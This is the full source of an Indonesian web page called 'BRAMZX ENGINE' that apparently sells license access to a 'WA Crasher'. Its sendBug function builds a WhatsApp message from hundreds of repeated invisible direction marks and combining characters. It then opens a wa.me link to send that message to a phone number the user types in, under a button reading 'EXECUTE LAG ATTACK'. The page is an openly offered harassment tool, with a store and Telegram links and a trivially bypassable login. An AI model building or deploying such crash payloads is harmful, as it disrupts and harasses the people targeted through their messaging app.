<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BRAMZX ENGINE | SOUND FIXED</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --red: #ff0000; --purple: #a020f0; --bg: #050505; --card: #121212; }
        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; overflow-x: hidden; }
        .hidden { display: none !important; }

        /* --- SOUND BUTTON (FIXED) --- */
        .sound-btn { 
            position: fixed; 
            top: 20px; 
            right: 20px; 
            z-index: 9999; 
            background: rgba(255,0,0,0.2); 
            border: 1px solid var(--red); 
            color: #fff; 
            width: 45px; 
            height: 45px; 
            border-radius: 50%; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            cursor: pointer; 
            box-shadow: 0 0 10px var(--red);
        }

        .video-banner { width: 100%; border-radius: 15px; border: 1px solid #333; object-fit: cover; margin-bottom: 20px; }

        /* --- LOGIN --- */
        #login-page { height: 100vh; display: flex; justify-content: center; align-items: center; background: #000; }
        .login-card { width: 330px; background: #111; border: 1px solid #222; border-radius: 25px; padding: 25px; text-align: center; }
        input.login-in { width: 100%; padding: 15px; margin: 10px 0; background: #222; border: 1px solid #333; color: #fff; border-radius: 12px; box-sizing: border-box; text-align: center; outline: none; }
        .btn-login { width: 100%; padding: 15px; background: #fff; border: none; color: #000; border-radius: 12px; font-weight: bold; cursor: pointer; }

        /* --- DASHBOARD --- */
        #dashboard { padding: 20px; animation: fadeIn 0.5s; }
        .profile-header { background: #111; border-radius: 20px; padding: 15px; display: flex; align-items: center; gap: 15px; border: 1px solid #222; margin-bottom: 20px; }
        .avatar { width: 50px; height: 50px; border-radius: 50%; border: 2px solid var(--red); }
        .grid-menu { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
        .menu-box { background: #151515; border-radius: 15px; padding: 20px; text-align: center; border: 1px solid #222; cursor: pointer; }
        .menu-box i { font-size: 24px; color: var(--red); margin-bottom: 10px; display: block; }
        .badge { background: #300; color: var(--red); padding: 2px 8px; border-radius: 5px; font-size: 10px; font-weight: bold; border: 1px solid var(--red); }

        /* --- CRASHER --- */
        #crasher-page { padding: 20px; animation: fadeIn 0.5s; }
        .crasher-card { background: #111; border: 1px solid var(--purple); border-radius: 20px; padding: 20px; }
        .btn-send { width: 100%; padding: 15px; background: linear-gradient(to right, #4b0082, #a020f0); border: none; border-radius: 10px; color: #fff; font-weight: bold; margin-top: 20px; cursor: pointer; }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

<div class="sound-btn" onclick="toggleMute()">
    <i id="vol-icon" class="fas fa-volume-mute"></i>
</div>

<div id="login-page">
    <div class="login-card">
        <video id="vid-login" class="video-banner" loop muted playsinline autoplay>
            <source src="https://RYxinz.github.io/video-bug/loading.mp4" type="video/mp4">
        </video>
        <h2>BRAMZX ENGINE</h2>
        <input type="text" id="u-key" class="login-in" placeholder="License ID">
        <input type="password" id="p-key" class="login-in" placeholder="Password">
        <button class="btn-login" onclick="doLogin()">LOGIN</button>
    </div>
</div>

<div id="dashboard" class="hidden">
    <div class="profile-header">
        <img src="https://RYxinz.github.io/Jpg/pmdg4.jpg" class="avatar">
        <div>
            <h3 id="u-name" style="margin:0;">BRAMZX OWNER</h3>
            <span class="badge">VVIP ACCESS ACTIVE</span>
        </div>
    </div>
    <div class="grid-menu">
        <div class="menu-box" onclick="goToCrasher()"><i class="fas fa-skull"></i><span>WA Crasher</span></div>
        <div class="menu-box" onclick="window.open('https://t.me/BramzProject')"><i class="fab fa-telegram-plane"></i><span>Telegram</span></div>
        <div class="menu-box" onclick="window.open('https://lynk.id/bramxnew')"><i class="fas fa-shopping-bag"></i><span>Store</span></div>
        <div class="menu-box" onclick="location.reload()"><i class="fas fa-sign-out-alt"></i><span>Logout</span></div>
    </div>
</div>

<div id="crasher-page" class="hidden">
    <div class="crasher-card">
        <video id="vid-crasher" class="video-banner" loop muted playsinline>
            <source src="https://RYxinz.github.io/Bug/video.mp4" type="video/mp4">
        </video>
        <button onclick="backToDash()" style="color:#fff; background:none; border:none; margin-bottom:10px;"><i class="fas fa-arrow-left"></i> Kembali</button>
        <input type="text" id="target" style="width:100%; background:#222; border:1px solid var(--purple); padding:15px; border-radius:10px; color:#fff;" placeholder="6289xxx">
        <button class="btn-send" onclick="sendBug()">EXECUTE LAG ATTACK</button>
    </div>
</div>

<script>
    const vLogin = document.getElementById('vid-login');
    const vCrasher = document.getElementById('vid-crasher');
    const volIcon = document.getElementById('vol-icon');

    // FUNGSI AKTIF/NONAKTIF SOUND
    function toggleMute() {
        if (vLogin.muted) {
            vLogin.muted = false; vCrasher.muted = false;
            volIcon.className = "fas fa-volume-up";
        } else {
            vLogin.muted = true; vCrasher.muted = true;
            volIcon.className = "fas fa-volume-mute";
        }
    }

    // DB 80 USER
    const DB = { "BRAMZX-OWNER-999": { name: "BRAMZX OWNER" } };
    for (let i = 1; i <= 80; i++) {
        let k = "BRAMZX-VIP-" + (i < 10 ? '0' + i : i);
        DB[k] = { name: "VIP USER #" + i };
    }

    function doLogin() {
        const u = document.getElementById('u-key').value.trim();
        const p = document.getElementById('p-key').value.trim();
        if (DB[u] && u === p) {
            vLogin.pause();
            document.getElementById('login-page').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('u-name').innerText = DB[u].name;
            document.querySelector('.sound-btn').classList.add('hidden'); // Auto hide pas login
        } else { alert("LICENSE SALAH!"); }
    }

    function goToCrasher() {
        document.querySelector('.sound-btn').classList.remove('hidden');
        vCrasher.play();
        document.getElementById('dashboard').classList.add('hidden');
        document.getElementById('crasher-page').classList.remove('hidden');
    }

    function backToDash() {
        vCrasher.pause();
        document.querySelector('.sound-btn').classList.add('hidden');
        document.getElementById('crasher-page').classList.add('hidden');
        document.getElementById('dashboard').classList.remove('hidden');
    }

    function sendBug() {
        const target = document.getElementById('target').value.replace(/[^0-9]/g, '');
        if (!target) return alert("NO TARGET!");
        // PAYLOAD LAG BERAT
        const lag = "‎‏".repeat(600) + "ॣ".repeat(400);
        const payload = `*BRAMZX LAG ATTACK*%0A${lag}%0A*STATUS:* CRITICAL LAG`;
        window.open(`https://wa.me/${target}?text=${payload}`, '_blank');
    }
</script>
</body>
  </html>
